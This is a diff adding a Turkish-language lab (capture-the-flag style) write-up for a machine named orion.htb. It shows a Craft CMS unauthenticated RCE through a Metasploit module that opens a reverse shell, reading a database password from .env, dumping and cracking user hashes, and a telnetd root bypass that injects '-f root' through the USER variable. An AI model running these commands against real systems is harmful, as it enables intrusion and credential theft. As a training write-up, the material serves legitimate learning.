@@ -1,0 +1,69 @@
+Nmap ile başladım, 22 ve 80 açık. 80'e gittiğimde `orion.htb`'ye redirect attı.
+
+echo "10.129.231.23 orion.htb" | sudo tee -a /etc/hosts
+
+Site bir telekom şirketinin sayfasıydı, footer'da "Powered by CraftCMS" yazıyordu. `/admin` endpoint'ine gittiğimde login sayfasına yönlendirdi. Sayfanın altında **Craft CMS 5.6.16** yazıyordu.
+
+
+Hızlıca araştırınca bu versiyonun **CVE-2025-32432**'ye karşı savunmasız olduğunu gördüm — unauthenticated RCE.
+
+Exploit üç adımda çalışıyor:
+
+1. `phpinfo()` tetikleyerek session dosyasının nerede saklandığını öğren
+2. Admin sayfasına GET isteğiyle PHP kodu enjekte et, session dosyasına yazılsın
+3. `generate-transform` endpoint'ine POST atarak session dosyasını include et, kod çalışsın
+
+Metasploit modülü her şeyi otomatik yapıyor:
+
+msfconsole -q 
+msfconsole -q -x "use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432; set rhosts orion.htb; set rport 80; set lhost tun0; exploit"
+
+
+
+`www-data` olarak shell aldım.
+
+## User
+
+`.env` dosyasında MySQL şifresi açık yazıyordu:
+
+```bash
+cat /var/www/html/craft/.env
+# CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+```
+
+MySQL'e girip users tablosunu çektim:
+
+
+mysql -u root -pSuperSecureCraft123Pass! orion -e "select username,email,password from users;"
+
+
+`adam@orion.htb` kullanıcısının bcrypt hash'i çıktı. Hashcat ile kırdım:
+
+
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+$2y$13$e9z...:darkangel
+
+SSH ile girdim:
+
+ssh adam@orion.htb
+# şifre: darkangel
+
+user.txt masaüstündeydi, aldım.
+
+
+## Privilege Escalation
+
+netstat -tulnp ile localhost'ta port 23 (telnet) açık olduğunu gördüm.
+
+
+telnet --version
+telnet (GNU inetutils) 2.7
+
+
+Bu versiyon **CVE-2026-24061**'e karşı savunmasız — `USER` environment variable'ı ile authentication bypass mümkün. `telnetd`, `login -f <user>` şeklinde çağırıyor ve `-f` flag'i şifre doğrulamasını atlıyor.
+
+USER="-f root" telnet -a 127.0.0.1
+
+
+Root shell geldi, root.txt alındı.
+
